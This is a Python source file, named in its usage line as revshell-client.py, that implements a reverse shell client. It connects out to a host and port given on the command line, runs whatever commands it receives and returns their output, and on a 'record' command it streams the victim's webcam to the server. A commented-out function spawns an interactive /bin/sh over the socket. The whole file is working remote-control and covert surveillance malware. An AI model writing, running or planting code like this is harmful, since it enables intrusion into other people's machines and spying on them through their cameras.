import socket
import os
import subprocess
import sys
from subprocess import run
import cv2
import pickle
import struct
import imutils

# def spawn_shell(s):
	
# 	os.dup2(s.fileno(), 0) 
# 	os.dup2(s.fileno(), 1) 
# 	os.dup2(s.fileno(), 2) 
# 	run(["/bin/sh","-i"])

class VideoStream:
	def __init__(self, s):
		self.s = s

	def send(self):
		print("Starting recording...")
		vid = cv2.VideoCapture(0)
		print("Sending to server")
		while(vid.isOpened()):
			img,frame = vid.read()
			a = pickle.dumps(frame)
			message = struct.pack("Q", len(a)) + a
			self.s.sendall(message)
			print("Showing screen")
			cv2.imshow('Sender', frame)
			key = cv2.waitKey(10)
			if key == 13:
				return


def main(SERVER_HOST, SERVER_PORT):
	BUFFER_SIZE = 1024 * 128

	s = socket.socket()
	s.connect((SERVER_HOST, SERVER_PORT))
	while True:
		command = s.recv(BUFFER_SIZE).decode().strip()
		if not command:
			break
		splitted_command = command.split()
		if command == "exit":
			break
		if splitted_command[0] == "cd":
			try:
				os.chdir(' '.join(splited_command[1:]))
			except FileNotFoundError as e:
				output = str(e)
			else:
				output = ""
		elif splitted_command[0] == "record":
			stream = VideoStream(s)
			stream.send()
		#elif command == "shell":
		#	spawn_shell(s)
		else:
			output = subprocess.getoutput(command)
			s.send(output.encode())
	s.close()


if __name__ == '__main__':
	if len(sys.argv) != 3:
		print("Usage: python3 revshell-client.py <ip> <port>")
		exit(1)
	main(sys.argv[1], int(sys.argv[2]))